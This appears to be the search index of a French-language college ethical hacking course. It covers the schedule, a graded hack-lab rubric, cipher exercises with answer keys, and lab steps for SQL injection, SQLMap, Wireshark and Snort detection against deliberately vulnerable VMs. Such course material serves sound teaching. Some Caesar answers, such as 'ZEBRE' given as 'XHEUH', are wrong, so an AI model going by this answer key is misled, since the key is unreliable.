{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Cours de piratage \u00e9thique du C\u00e9gep de Victoriaville","text":""},{"location":"#presentation-du-professeur","title":"Pr\u00e9sentation du professeur","text":"<p>Nom : \u00c9tienne Rivard</p> <p>\u00c9tudes :</p> <ul> <li>Ma\u00eetrise en TI</li> <li>Ma\u00eetrise en technologies \u00e9ducatives</li> </ul> <p>Derniers emplois :</p> <ul> <li>Consultant en s\u00e9curit\u00e9</li> <li>Directeur TI</li> <li>Architecte de s\u00e9curit\u00e9</li> <li>Professeur</li> </ul>"},{"location":"#presentation-du-cours","title":"Pr\u00e9sentation du cours","text":"<p>Ce cours consiste \u00e0 faire un tableau des diff\u00e9rents sujets relatifs \u00e0 la cybers\u00e9curit\u00e9.</p>"},{"location":"horaire/","title":"Horaire du cours de piratage \u00e9thique","text":"Semaine Cours Date Sujet Exercice 1 1 2025-08-22 15:15:00 Introduction Mots de passe B\u00e2tir le laboratoire 1 2 2025-08-26 14:15:00 Reconnaissance passive Reconnaissance passive 2 3 2025-08-29 15:15:00 Reconnaissance active Reconnaissance active 2 4 2025-09-02 14:15:00 \u00c9coute du r\u00e9seau \u00c9coute du r\u00e9seau 3 5 2025-09-05 15:15:00 Gestion de risques Gestion du risque 3 6 2025-09-12 14:15:00 Evaluation formative (1h)retour sur \u00e9valuation (1h) 4 7 2025-09-16 14:15:00 Introduction \u00e0 Metasploit Introduction \u00e0 Metasploit 4 8 2025-09-19 15:15:00 Strat\u00e9gies de sauvegarde Strat\u00e9gie de sauvegarde 5 9 2025-09-23 14:15:00 Pare-feux Pare-feux 5 10 2025-09-26 15:15:00 Hame\u00e7onnage Hameconnage 6 11 2025-09-30 14:15:00 Vuln\u00e9rabilit\u00e9s Web Vuln\u00e9rabilit\u00e9s Web 6 12 2025-10-03 15:15:00 Injections SQL Injections SQL 7 13 2025-10-07 14:15:00 Cryptographie Cryptographie 7 14 2025-10-10 15:15:00 Tests de p\u00e9n\u00e9tration Tests de p\u00e9n\u00e9tration 8 15 2025-10-21 14:15:00 Hack Lab (pratique seulement) \u00c9valuation : Hack Lab 8 16 2025-10-24 15:15:00 Hack Lab (pratique seulement) \u00c9valuation : Hack Lab 9 17 2025-10-28 14:15:00 Hack Lab (pratique seulement) \u00c9valuation : Hack Lab 9 18 2025-10-31 15:15:00 Inventaire d'actifs Classification d'actifs 10 19 2025-11-04 14:15:00 P\u00e9n\u00e9tration de r\u00e9seaux sans-fils P\u00e9n\u00e9tration de r\u00e9seaux sans-fils 10 20 2025-11-07 15:15:00 Lois Lois 11 21 2025-11-11 14:15:00 Antivirus et PDF malicieux PDF Malicieux 11 22 2025-11-14 15:15:00 D\u00e9tection d'intrusion D\u00e9tection d'intrusion 12 23 2025-11-18 14:15:00 S\u00e9curiser serveur Apache S\u00e9curiser serveur Apache 12 24 2025-11-21 15:15:00 Examen mi-session 13 25 2025-11-25 14:15:00 Programmer application s\u00e9curis\u00e9e Protection injection SQL Programmation Protection injection SQL 13 26 2025-11-28 15:15:00 Chiffrement et donn\u00e9es sensibles Chiffrement 14 27 2025-12-02 14:15:00 Terminer MonMur Terminer MonMur 14 28 2025-12-05 15:15:00 Terminer MonMur Terminer MonMur 15 29 2025-12-09 14:15:00 Examen final - Premi\u00e8re partie Examen final - Premi\u00e8re partie 15 30 2025-12-12 15:15:00 Examen final - Deuxi\u00e8me partie Examen final - Deuxi\u00e8me partie"},{"location":"evaluations/Hack_lab/","title":"\u00c9valuation - Hack Lab","text":"<p>Le but de cette \u00e9valuation est de tester vos connaissances dans la p\u00e9n\u00e9tration de syst\u00e8mes informatiques.</p> <p>La machine virtuelle que vous allez attaquer s'appelle Dundermifflin. Il y a un code secret cach\u00e9 dans le serveur que vous devrez trouver.</p> <p>Pour installer dundermifflin</p> <p>Pour ceux qui terminent plus t\u00f4t, essayez de cracker la VM gogo et son TRESOR.</p>"},{"location":"evaluations/Hack_lab/#instructions","title":"Instructions","text":"<p>Vous allez produire un rapport qui d\u00e9taillera toutes les \u00e9tapes de vos tests de p\u00e9n\u00e9tration.</p> <p>Le mod\u00e8le de rapport se trouve ici.</p> <p>Voici les sections de votre rapport :</p> <ul> <li>R\u00e9sultats de votre reconnaissance active (indiquez tous les outils utilis\u00e9s et leurs r\u00e9sultats)</li> <li>Le d\u00e9tail de tous vos essais pour p\u00e9n\u00e9trer le serveur (ce que vous avez essay\u00e9, quel est le r\u00e9sultat)</li> <li>Le d\u00e9tail de la recherche du SECRET (ce que vous avez essay\u00e9, quel est le r\u00e9sultat)</li> <li>Le r\u00e9sultat final : le code secret (r\u00e9soudre l'\u00e9nigme dans le fichier)</li> </ul> <p>Vous devrez utiliser Kali comme syst\u00e8me d'attaque.</p> <p>Vous avez trois cours pour faire ce laboratoire.</p>"},{"location":"evaluations/Hack_lab/#grille-devaluation","title":"Grille d'\u00e9valuation","text":"10 points Excellent Satisfaisant Minimal Faible Insuffisant Rapport - Reconnaissance active Le rapport contient 4 outils.  6 points Le rapport contient 3 outils.  5 points Le rapport contient 2 outil.  3 points Le rapport contient 1 outil.  1 point Le rapport ne contient pas d'outil.  0 point Rapport - \u00c9tapes de p\u00e9n\u00e9tration Le rapport contient 4 \u00e9tapes de p\u00e9n\u00e9tration.  9 points Le rapport contient 3 \u00e9tapes de p\u00e9n\u00e9tration.  7 points Le rapport contient 2 \u00e9tapes de p\u00e9n\u00e9tration.  6 points Le rapport contient 1 \u00e9tape de p\u00e9n\u00e9tration. 3 points Le rapport ne contient pas d'\u00e9tape de p\u00e9n\u00e9tration  0 point Rapport - \u00c9tapes de recherche du secret Le rapport contient 4 \u00e9tapes de recherche du secret.  9 points Le rapport contient 3 \u00e9tapes de recherche du secret.  7 points Le rapport contient 2 \u00e9tapes de recherche du secret  6 points Le rapport contient 1 \u00e9tape de recherche du secret 3 point Le rapport ne contient pas d'\u00e9tape de recherche du secret  0 point Code secret et \u00e9nigme Le code secret est trouv\u00e9 et l'\u00e9nigme est r\u00e9solue  6 points Le code secret a \u00e9t\u00e9 trouv\u00e9 mais l'\u00e9nigme n'a pas \u00e9t\u00e9 r\u00e9solue.  3 points Le code secret n'a pas \u00e9t\u00e9 trouv\u00e9.  0 point 30 points - 30% de la note finale"},{"location":"evaluations/evaluation_sommative/","title":"\u00c9valuation sommative du cours de piratage \u00e9thique","text":"\u00c9valuation Valeur Date de remise ou de l'examen Hack lab 30% 2024-10-21 Examen mi-session 30% 2024-11-22 Examen fin de session 40% 2024-12-13"},{"location":"evaluations/examen_mi_session/","title":"Examen mi-session","text":"<p>L'examen de mi-session est th\u00e9orique sans acc\u00e8s aux notes ou appareil \u00e9lectronique.  </p>"},{"location":"evaluations/examen_mi_session/#revision","title":"R\u00e9vision","text":"<p>Le style de questions de l'examen est tr\u00e8s similaire aux petits quiz que vous avez fait \u00e0 la fin de chaque le\u00e7on.  Un bon exercice de r\u00e9vision est donc de refaire l'ensemble des petits quiz. Les voici pour votre convenance :  </p> <p>Petit quiz sur la reconnaissance passive Petit quiz sur la reconnaissance active Petit quiz sur l'\u00e9coute du r\u00e9seau Petit quiz sur la gestion de risques Petit quiz sur Metasploit Petit quiz sur les strat\u00e9gies de sauvegarde Petit quiz sur les pare-feux Petit quiz sur les antivirus et pdf malicieux Petit quiz sur le chiffrement Petit quiz sur l'inventaire d'actifs Petit quiz sur la p\u00e9n\u00e9tration de r\u00e9seau sans-fils Petit quiz sur la loi </p>"},{"location":"exercices/Chiffrement/","title":"Exercices - Chiffrement","text":""},{"location":"exercices/Chiffrement/#quiz-sur-la-theorie","title":"Quiz sur la th\u00e9orie","text":"<p>Petit quiz sur le chiffrement et donn\u00e9es sensibles </p>"},{"location":"exercices/Chiffrement/#exercice-obligatoire","title":"Exercice obligatoire","text":""},{"location":"exercices/Chiffrement/#code-source","title":"Code source","text":"<p>Le code source de l'application MonMur se trouve dans la VM MonMur.</p>"},{"location":"exercices/Chiffrement/#vm-contenant-lapplication-web","title":"VM contenant l'application Web","text":"<p>L'application MonMur se trouve sur la VM MonMur.</p> <p>Durant cet exercice, vous aurez \u00e0 utiliser les techniques de chiffrement pour :  </p> <ul> <li>Le mot de passe  </li> <li>Le contenu des commentaires  </li> </ul> <p>Modifier l'application \u00e0 tous les endroits o\u00f9 la base de donn\u00e9es est utilis\u00e9e.</p> <p>L'application se trouve dans <code>/var/www</code>.</p>"},{"location":"exercices/Cryptographie/","title":"Exercices - Cryptographie","text":""},{"location":"exercices/Cryptographie/#quiz-sur-la-theorie","title":"Quiz sur la th\u00e9orie","text":"<p>Petit quiz sur le chiffrement </p>"},{"location":"exercices/Cryptographie/#exercices-obligatoires","title":"Exercices obligatoires","text":""},{"location":"exercices/Cryptographie/#1-cesar","title":"1. C\u00e9sar","text":"<p>D\u00e9chiffrez ces courts messages avec l'algorithme de C\u00e9sar :  </p> <p>1a <code>VDODGH FHVDU</code> </p> Cliquer pour afficher la r\u00e9ponse SALADE CESAR  <p>1b <code>SRXWLQH</code></p> Cliquer pour afficher la r\u00e9ponse POUTINE  <p>1c <code>DUWKXU GHQW</code></p> Cliquer pour afficher la r\u00e9ponse ARTHUR DENT  <p>1d <code>SLUDWDJH</code></p> Cliquer pour afficher la r\u00e9ponse ABCDEFGHIJKLMNOPQRSTUVWXYZ DEFGHIJKLMNOPQRSTUVWXYZABC  PIRATAGE  <p>Chiffrez ces courts messages avec l'algorithme de C\u00e9sar :  </p> <p>1e <code>GOOGLE MAPS</code> </p> Cliquer pour afficher la r\u00e9ponse JRRJOH PDS  <p>1f <code>ZEBRE</code></p> Cliquer pour afficher la r\u00e9ponse XHEUH  <p>Trouvez la clef de chiffrement de ce message (la distance entre la lettre originale et la lettre chiffr\u00e9e) et d\u00e9codez ce message avec l'algorithme de C\u00e9sar :</p> <p>\"cxdc ujkjb, jd orw oxwm mnb canoxwmb rwngyuxanb nc vju ojvnb md kxdc md kajb xllrmnwcju mn uj pjujgrn, cajrwn dw yncrc bxunru sjdwjcan nc vrwjkun. nw xakrcn jdcxda mn lnudrlr, j uj mrbcjwln jyyaxgrvjcren mn lnwc lrwzdjwcn vruurxwb mn truxvncanb, bn caxden dwn yncrcn yujwncn kundenac nc cxcjunvnwc wnpurpnjkun mxwc unb qjkrcjwcb, mnblnwmdb md brwpn, bxwc yarvrcrob jd yxrwc mn laxran nwlxan zdn unb vxwcanb j zdjaci wdvnarzdnb bxwc dwn ejlqcn mn lqxdnccn rmnn. lnccn yujwncn j, xd yudcxc, nuun jejrc, dw yaxkunvn, j bjexra lnudrlr : uj yudyjac mn bnb qjkrcjwcb ncjrnwc vjuqndandg uj yudyjac md cnvyb. krnw mnb bxudcrxwb jejrnwc ncn bdppnannb vjrb uj yudyjac mnwcan nuunb ojrbjrnwc ujapnvnwc rwcnaenwra uj vrbn nw lraldujcrxw mn yncrcb kxdcb mn yjyrna enac, lqxbn ldarndbn ydrbzdn nw mnorwrcren ln wncjrnwc yjb unb kxdcb mn yjyrna enac zdr ncjrnwc vjuqndandg.\"</p> Cliquer pour afficher la r\u00e9ponse ROT 9.   tout labas, au fin fond des trefonds inexplores et mal fames du bout du bras occidental de la galaxie, traine un petit soleil jaunatre et minable. en orbite autour de celuici, a la distance approximative de cent cinquante millions de kilometres, se trouve une petite planete bleuvert et totalement negligeable dont les habitants, descendus du singe, sont primitifs au point de croire encore que les montres a quartz numeriques sont une vachte de chouette idee. cette planete a, ou plutot, elle avait, un probleme, a savoir celuici : la plupart de ses habitants etaient malheureux la plupart du temps. bien des solutions avaient ete suggerees mais la plupart dentre elles faisaient largement intervenir la mise en circulation de petits bouts de papier vert, chose curieuse puisque en definitive ce netaient pas les bouts de papier vert qui etaient malheureux."},{"location":"exercices/Cryptographie/#2-vigenere","title":"2. Vigen\u00e8re","text":"<p>D\u00e9chiffrez ces messages avec l'algorithme de substitution Vigen\u00e8re :</p> <p>2a : Chiffre-texte : <code>DYMJCS FMVC SV YSTV</code> Cl\u00e9 secr\u00e8te : <code>BRIOCHE</code> </p> Cliquer pour afficher la r\u00e9ponse CHEVAL BLEU ET ROSE  <p>2b : Chiffre-texte : <code>IWQSUT I KTNTBSD</code> Cl\u00e9 secr\u00e8te : <code>PIZZA</code> </p> Cliquer pour afficher la r\u00e9ponse TORTUE A LUNETTE  <p>2c : Chiffre-texte : <code>AIPMO CM RVOOZPG WTTBXM</code> Cl\u00e9 secr\u00e8te : <code>VICTORIAVILLE</code> </p> Cliquer pour afficher la r\u00e9ponse FANTA LE RAGDOLL ORANGE  <p>Chiffrez ces messages avec l'algorithme de substitution Vigen\u00e8re :  </p> <p>2d : Plain-texte : <code>PIRATAGE ETHIQUE</code> Cl\u00e9 secr\u00e8te : <code>BONHEUR</code></p> Cliquer pour afficher la r\u00e9ponse QWEHXUXF SGOMKLF  <p>2e : Plain-texte : <code>ACTION DE GRACE</code> Cl\u00e9 secr\u00e8te : <code>CONGE</code></p> Cliquer pour afficher la r\u00e9ponse CQGOSP RR MVCQR"},{"location":"exercices/Cryptographie/#3-transposition","title":"3. Transposition","text":"<p>D\u00e9chiffrez ces messages avec l'algorithme de transposition :</p> <p>3a : Chiffre-texte : <code>ADAUREBMROARPTNESBEARETSUEUNGSTEDNU</code> Cl\u00e9 secr\u00e8te : <code>BACON</code> </p> Cliquer pour afficher la r\u00e9ponse MANGERDESTOASTSAUBEURREDEPEANUTBRUN MANGER DES TOASTS AU BEURRE DE PEANUT BRUN  <p>3b : Chiffre-texte : <code>EJETPASIOCCENQARLTUR</code> Cl\u00e9 secr\u00e8te : <code>VELOS</code> </p> Cliquer pour afficher la r\u00e9ponse LEPONTJACQUESCARTIER LE PONT JACQUES CARTIER  <p>3c : Chiffre-texte : <code>FLTARSUAAXGEOSTHUELNEAERIOMCNCOMSIH</code> Cl\u00e9 secr\u00e8te : <code>ALPHA</code> </p> Cliquer pour afficher la r\u00e9ponse FANTALECHATROUXAIMEGROSLESMINOUCHES FANTA LE CHAT ROUX AIME GROS LES MINOUCHES  <p>Chiffrez ces messages avec l'algorithme de transposition :  </p> <p>3d : Plain-texte : <code>PARESSEUX</code> Cl\u00e9 secr\u00e8te : <code>TROIS</code></p> Cliquer pour afficher la r\u00e9ponse EXRUAESPS"},{"location":"exercices/Cryptographie/#4-envoyer-un-message-chiffre-a-lenseignant","title":"4. Envoyer un message chiffr\u00e9 \u00e0 l'enseignant","text":"<ol> <li>Importez la cl\u00e9 publique de l'enseignant dans votre trousseau gpg. cl\u00e9 publique  courriel : rivard.etienne@cegepvicto.ca  </li> <li>Cr\u00e9ez un fichier texte avec votre nom, votre num\u00e9ro de DA et la date du jour.  </li> <li>Chiffrez ce fichier texte avec la cl\u00e9 publique.  </li> <li>Envoyez le fichier chiffr\u00e9 \u00e0 l'enseignant par courriel.  </li> </ol>"},{"location":"exercices/Cryptographie/#exercice-optionnel","title":"Exercice optionnel","text":""},{"location":"exercices/Cryptographie/#4-transposition-sans-cle","title":"4. Transposition sans cl\u00e9","text":"<p>Votre d\u00e9fi est de cracker le texte suivant, sans avoir la cl\u00e9. Utilisez la force brute pour y arriver.  </p> <p>ITVVUCEOLASAEAKCETNSRICECIOESRRDFIOUZSACE</p> Cliquer pour afficher la r\u00e9ponse FELICITATIONSVOUSAVEZREUSSIACRACKERCECODE FFELICITATIONS VOUS AVEZR EUSSI A CRACKER CE CODE"},{"location":"exercices/Detection_intrusion/","title":"Exercices - D\u00e9tection d'intrusion","text":""},{"location":"exercices/Detection_intrusion/#quiz-sur-la-theorie","title":"Quiz sur la th\u00e9orie","text":"<p>Petit quiz de la d\u00e9tection d'intrusion </p>"},{"location":"exercices/Detection_intrusion/#exercices-obligatoires","title":"Exercices obligatoires","text":"<p>Vous aurez besoin de la machine virtuelle de snort :  snort </p> <p>Assurez-vous que snort a sa carte r\u00e9seau en promiscuous.</p> <p>Vous aurez besoin de 3 VM : Kali, snort et Metasploit.  </p>"},{"location":"exercices/Detection_intrusion/#nmap","title":"NMAP","text":"<ol> <li>Cr\u00e9ez une r\u00e8gle dans snort qui d\u00e9tecte un NMAP Syn scan </li> <li>\u00c0 partir de Kali, balayez Metasploitable avec nmap  </li> <li>V\u00e9rifiez que snort d\u00e9tecte bien le balayage   </li> </ol>"},{"location":"exercices/Detection_intrusion/#ftp-avec-user-root","title":"FTP avec user root","text":"<ol> <li>Cr\u00e9ez une r\u00e8gle dans snort qui d\u00e9tecte FTP avec user root </li> <li>\u00c0 partir de Kali, connectez-vous \u00e0 Metasploitable avec ftp et utilisateur root  (utilisez n'importe quel mot de passe, le but est de d\u00e9tecter la tentative de connexion)  </li> <li>V\u00e9rifiez que snort d\u00e9tecte bien la tentative de connexion   </li> </ol>"},{"location":"exercices/Detection_intrusion/#telnet-avec-login-invalide","title":"Telnet avec login invalide","text":"<ol> <li>Cr\u00e9ez une r\u00e8gle dans snort qui d\u00e9tecte Telnet avec login invalide </li> <li>\u00c0 partir de Kali, connectez-vous \u00e0 Metasploitable avec telnet et n'importe quel utilisateur. (utilisez n'importe quel mot de passe, le but est de d\u00e9tecter la tentative de connexion)  </li> <li>V\u00e9rifiez que snort d\u00e9tecte bien la tentative de connexion invalide  </li> </ol>"},{"location":"exercices/Detection_intrusion/#exercices-optionels","title":"Exercices optionels","text":""},{"location":"exercices/Detection_intrusion/#ssh","title":"SSH","text":"<ol> <li>Cr\u00e9ez une r\u00e8gle dans snort qui d\u00e9tecte une connexion au service ssh </li> <li>\u00c0 partir de Kali, connectez-vous \u00e0 Metasploitable avec ssh (utilisateur : msfadmin, mot de passe : msfadmin) </li> <li>V\u00e9rifiez que snort d\u00e9tecte bien la connexion ssh  </li> </ol>"},{"location":"exercices/Detection_intrusion/#nikto","title":"Nikto","text":"<ol> <li>Cr\u00e9ez une r\u00e8gle dans snort qui d\u00e9tecte un balayage avec Nikto </li> <li>\u00c0 partir de Kali, balayez Metasploitable avec nikto  </li> <li>V\u00e9rifiez que snort d\u00e9tecte bien le balayage   </li> </ol>"},{"location":"exercices/Ecoute_reseau/","title":"Exercices - \u00c9coute du r\u00e9seau","text":""},{"location":"exercices/Ecoute_reseau/#quiz-sur-la-theorie","title":"Quiz sur la th\u00e9orie","text":"<p>Petit quiz sur l'\u00e9coute du r\u00e9seau </p>"},{"location":"exercices/Ecoute_reseau/#exercices-obligatoires","title":"Exercices obligatoires","text":"<p>Pour ces exercices, vous aurez besoin des VM suivantes : - Kali - Metasploitable  </p> <p>Assurez-vous que votre VM Kali est configur\u00e9 pour le mode promiscuous.</p>"},{"location":"exercices/Ecoute_reseau/#1-ping","title":"1 - Ping","text":"<p>D\u00e9marrer la capture dans Wireshark.</p> <p>Dans la VM Metasploitable, lancez un <code>ping 8.8.8.8</code></p> <p>Arr\u00eatez la capture dans Wireshark.</p> <p>Quel est le protocole utilis\u00e9?</p> <p>Prenez un Echo (ping) request et trouvez sa r\u00e9ponse.</p> <p>Quelle est l'adresse IP source de la requ\u00eate? Quelle est sa destination?</p>"},{"location":"exercices/Ecoute_reseau/#2-nmap","title":"2 - nmap","text":"<p>D\u00e9marrer la capture dans Wireshark.</p> <p>Dans la VM Kali, lancez un nmap avec comme cible la VM Metasploitable.</p> <p>Arr\u00eatez la capture dans Wireshark.</p> <p>Quel est le protocole utilis\u00e9?</p> <p>Que ce passe-t'il lorsqu'un port est ouvert?</p> <p>Que ce passe-t'il lorsqu'un port est ferm\u00e9?</p>"},{"location":"exercices/Ecoute_reseau/#3-telnet","title":"3 - Telnet","text":"<p>D\u00e9marrer la capture dans Wireshark.</p> <p>Dans la VM Kali, connectez-vous \u00e0 Metasploitable via telnet (user et pass : msfadmin)</p> <p>Arr\u00eatez la capture dans Wireshark.</p> <p>Quel est le protocole utilis\u00e9?</p> <p>Reconstituez la conversation telnet. Quelle est la fonction pour \u00e7a?</p>"},{"location":"exercices/Ecoute_reseau/#4-https","title":"4 - HTTPS","text":"<p>D\u00e9marrer la capture dans Wireshark.</p> <p>Dans la VM Kali, ouvrez une page Web avec Firefox : https://www.google.ca.</p> <p>Arr\u00eatez la capture dans Wireshark.</p> <p>Quels sont les protocoles utilis\u00e9s?</p> <p>Pouvez-vous trouver les paquets utilis\u00e9s pour HTTPS?</p>"},{"location":"exercices/Ecoute_reseau/#exercices-optionnels","title":"Exercices optionnels","text":"<p>Pour ces exercices, vous aurez besoin des VM suivantes : - Kali - Metasploitable  </p>"},{"location":"exercices/Ecoute_reseau/#5-ftp","title":"5 - FTP","text":"<p>D\u00e9marrer la capture dans Wireshark.</p> <p>Dans la VM Kali, connectez-vous \u00e0 Metasploitable via ftp (user et pass : msfadmin)</p> <p>Parcourez les r\u00e9pertoires de Metasploitable avec les commandes <code>cd</code> et <code>ls</code>.</p> <p>Arr\u00eatez la capture dans Wireshark.</p> <p>Quel est le protocole utilis\u00e9?</p> <p>Pouvez-vous retrouver dans la capture de Wireshark le mot de passe saisi?</p> <p>Pouvez-vous expliquer pourquoi le code utilisateur entr\u00e9 est \u00e9crit dans la capture comme <code>mmssffaaddmmiinn</code>?  </p>"},{"location":"exercices/Ecoute_reseau/#6-openvas","title":"6 - OpenVAS","text":"<p>D\u00e9marrer la capture dans Wireshark.</p> <p>Dans la VM Kali, d\u00e9marrez un balayage avec OpenVAS.</p> <p>Attendez quelques minutes...</p> <p>Arr\u00eatez la capture dans Wireshark.</p> <p>Quels sont les protocoles utilis\u00e9s?</p>"},{"location":"exercices/Ecoute_reseau/#7-mysql-avance-seulement","title":"7 - MySQL (Avanc\u00e9 seulement)","text":"<p>D\u00e9marrer la capture dans Wireshark.</p> <p>Dans la VM Kali, connectez-vous \u00e0 Metasploitable via mysql (user root, mot de passe vide)</p> <p>Fa\u00eetes un <code>SHOW DATABASES</code></p> <p>Arr\u00eatez la capture dans Wireshark.</p> <p>Quel est le protocole utilis\u00e9?</p> <p>Pouvez-vous retrouver dans la capture de Wireshark le code utilisateur et le mot de passe saisis?</p>"},{"location":"exercices/Exercices_Laboratoire/","title":"Exercices - Cr\u00e9er son Laboratoire","text":"<p>D'ici le prochain cours, vous avez \u00e0 b\u00e2tir votre laboratoire pour le cours.</p> <p>Suivez les instructions des trois proc\u00e9dures suivantes :</p> <ol> <li>Installation de Kali Linux</li> <li>Installation de Metasploitable</li> <li>Installation de Windows XP</li> </ol>"},{"location":"exercices/Gestion_de_risques/","title":"Exercices - Gestion de risques","text":""},{"location":"exercices/Gestion_de_risques/#quiz-sur-la-theorie","title":"Quiz sur la th\u00e9orie","text":"<p>Petit quiz sur la gestion de risques </p>"},{"location":"exercices/Gestion_de_risques/#exercice-obligatoire","title":"Exercice obligatoire","text":""},{"location":"exercices/Gestion_de_risques/#assurances","title":"Assurances","text":""},{"location":"exercices/Gestion_de_risques/#mise-en-situation","title":"Mise en situation","text":"<p>La gestion de risque est une priorit\u00e9 pour la compagnie KRZ. Voici les informations collect\u00e9es pour leur centre de donn\u00e9es :</p> <ul> <li>La menace d'un d\u00e9sastre naturel se r\u00e9alise une fois aux cinq ans.</li> <li>Le centre de donn\u00e9es est \u00e9valu\u00e9 \u00e0 1,000,000$.</li> <li>\u00c0 chaque fois qu'il y a un d\u00e9sastre naturel, la compagnie doit d\u00e9penser 100,000$ pour r\u00e9parer le centre de donn\u00e9es.</li> <li>La compagnie a le choix de prendre une assurance \u00e0 10,000$ par ann\u00e9e.</li> </ul>"},{"location":"exercices/Gestion_de_risques/#questions","title":"Questions","text":"<p>Calculer les valeurs des variables suivantes :</p> Variable Formule Valeur AV $ EF % SLE SLE = AV * EF ARO # / ann\u00e9e ALE ALE = SLE * ARO <p>Quel choix la compagnie KRZ doit faire, prendre une assurance ou non?</p> <p>Justifier votre r\u00e9ponse.</p>"},{"location":"exercices/Gestion_de_risques/#exercices-optionnels","title":"Exercices optionnels","text":""},{"location":"exercices/Gestion_de_risques/#menace-de-cybersecurite-rancongiciel","title":"Menace de cybers\u00e9curit\u00e9 (ran\u00e7ongiciel)","text":""},{"location":"exercices/Gestion_de_risques/#mise-en-situation_1","title":"Mise en situation","text":"<p>La soci\u00e9t\u00e9 \"LogicielPro\" est de plus en plus pr\u00e9occup\u00e9e par les attaques par ran\u00e7ongiciels. Leurs donn\u00e9es clients sont leur actif le plus pr\u00e9cieux.</p> <ul> <li>Une attaque par ran\u00e7ongiciel r\u00e9ussie est estim\u00e9e survenir une fois tous les deux ans.</li> <li>La valeur des donn\u00e9es compromises et de la r\u00e9putation de l'entreprise est \u00e9valu\u00e9e \u00e0 2,500,000$.</li> <li>Une attaque r\u00e9ussie entra\u00eenerait une perte de productivit\u00e9, des co\u00fbts de r\u00e9cup\u00e9ration et des amendes potentielles totalisant 300,000$.</li> <li>La soci\u00e9t\u00e9 peut investir dans une solution de s\u00e9curit\u00e9 de pointe et la formation des employ\u00e9s pour un co\u00fbt annuel de 80,000$.</li> </ul>"},{"location":"exercices/Gestion_de_risques/#questions_1","title":"Questions","text":"<p>Calculer les valeurs des variables suivantes :</p> Variable Formule Valeur AV $ EF % SLE SLE = AV * EF ARO # / ann\u00e9e ALE ALE = SLE * ARO <p>Quel choix la compagnie LogicielPro doit-elle faire, investir dans la solution de s\u00e9curit\u00e9 ou non ?</p> <p>Justifier votre r\u00e9ponse.</p>"},{"location":"exercices/Gestion_de_risques/#panne-materielle-sur-un-equipement-non-critique","title":"Panne mat\u00e9rielle sur un \u00e9quipement non critique","text":""},{"location":"exercices/Gestion_de_risques/#mise-en-situation_2","title":"Mise en situation","text":"<p>L'entreprise \"Innov-Tech\" utilise un serveur de d\u00e9veloppement vieillissant pour des projets internes non critiques.</p> <ul> <li>Une panne mat\u00e9rielle majeure n\u00e9cessitant un remplacement complet du serveur survient en moyenne une fois tous les quatre ans.</li> <li>La valeur du serveur (mat\u00e9riel) est de 20,000$.</li> <li>En cas de panne, le serveur est une perte totale (il doit \u00eatre enti\u00e8rement remplac\u00e9).</li> <li>Un contrat de maintenance pr\u00e9ventive et de remplacement garanti est offert \u00e0 6,000$ par an.</li> </ul>"},{"location":"exercices/Gestion_de_risques/#questions_2","title":"Questions","text":"<p>Calculer les valeurs des variables suivantes :</p> Variable Formule Valeur AV $ EF % SLE SLE = AV * EF ARO # / ann\u00e9e ALE ALE = SLE * ARO <p>Quel choix la compagnie Innov-Tech doit-elle faire, souscrire au contrat de maintenance ou non ?</p> <p>Justifier votre r\u00e9ponse.</p>"},{"location":"exercices/Gestion_de_risques/#comparaison-de-deux-mesures-de-protection-avance","title":"Comparaison de deux mesures de protection (avanc\u00e9)","text":""},{"location":"exercices/Gestion_de_risques/#mise-en-situation_3","title":"Mise en situation","text":"<p>La soci\u00e9t\u00e9 de commerce en ligne \"VenteFlash\" subit des pertes financi\u00e8res \u00e0 cause de pannes de courant affectant son site web.</p> <ul> <li>Une panne de courant majeure affectant les ventes survient environ 2 fois par an.</li> <li>Chaque panne entra\u00eene une perte directe de revenus de 30,000$ (cette valeur repr\u00e9sente directement le SLE).</li> <li>Option 1 : Installer un syst\u00e8me d'alimentation sans interruption (UPS) pour un co\u00fbt annuel de 4,000$. Cet UPS peut pr\u00e9venir 80% des pertes.</li> <li>Option 2 : Installer un g\u00e9n\u00e9rateur diesel pour un co\u00fbt annuel de 15,000$. Le g\u00e9n\u00e9rateur pr\u00e9vient 100% des pertes.</li> </ul>"},{"location":"exercices/Gestion_de_risques/#questions_3","title":"Questions","text":"<ol> <li>Calculez l'ALE si aucune mesure n'est prise.</li> <li>Pour chaque option, calculez le co\u00fbt total annuel (co\u00fbt de la mesure + ALE r\u00e9siduel).</li> <li>L'ALE r\u00e9siduel est la perte annuelle attendue qui subsiste apr\u00e8s la mise en place de la mesure de protection.</li> <li>Quelle option la compagnie VenteFlash devrait-elle choisir (ne rien faire, UPS ou g\u00e9n\u00e9rateur) ?</li> </ol> <p>Justifier votre r\u00e9ponse en comparant le co\u00fbt total de chaque sc\u00e9nario.</p>"},{"location":"exercices/Hameconnage/","title":"Exercices - Hame\u00e7onnage","text":""},{"location":"exercices/Hameconnage/#simulation-de-courriels-de-hameconnage","title":"Simulation de courriels de hame\u00e7onnage","text":"<p>Fa\u00eetes le petit exercice suivant pour vous familiariser avec les courriels de hame\u00e7onnage.</p> <p>Simulateur de bo\u00eete de courriels de hame\u00e7onnage</p>"},{"location":"exercices/Injection_SQL/","title":"Exercices - Injections SQL","text":""},{"location":"exercices/Injection_SQL/#quiz-sur-la-theorie","title":"Quiz sur la th\u00e9orie","text":"<p>Petit quiz sur l'\u00e9coute du r\u00e9seau </p>"},{"location":"exercices/Injection_SQL/#exercices-obligatoires","title":"Exercices obligatoires","text":"<p>Allez sur la page de DVWA de Metasploitable via Firefox sur Kali.  </p> <p>Pour se connecter, user : admin et password : password </p>"},{"location":"exercices/Injection_SQL/#injection-sql-en-basse-securite","title":"Injection SQL en basse s\u00e9curit\u00e9","text":"<p>Faites les \u00e9tapes d'injection SQL avev DVWA en basse s\u00e9curit\u00e9 :   </p> <ol> <li>D\u00e9terminer le type d'assignation des valeurs dans la requ\u00eate  </li> <li>D\u00e9terminer le nombre de colonnes que la requ\u00eate retourne  </li> <li>Trouver les informations sur la base de donn\u00e9es</li> <li>Faire la liste des tables</li> <li>Faire la liste des champs des tables</li> </ol>"},{"location":"exercices/Injection_SQL/#extraction-de-la-table-users","title":"Extraction de la table users","text":"<p>Faites l'extraction de la table users avec une injection SQL manuelle.</p>"},{"location":"exercices/Injection_SQL/#utilisation-de-sqlmap","title":"Utilisation de SQLMap","text":"<p>Dans Kali, faites les \u00e9tapes suivantes  :</p> <ol> <li>Utiliser Firefox pour extraire les cookies</li> <li>Utiliser SQLMap pour d\u00e9couvrir la BD, la liste des tables de DVWA et le contenu de la table users.</li> 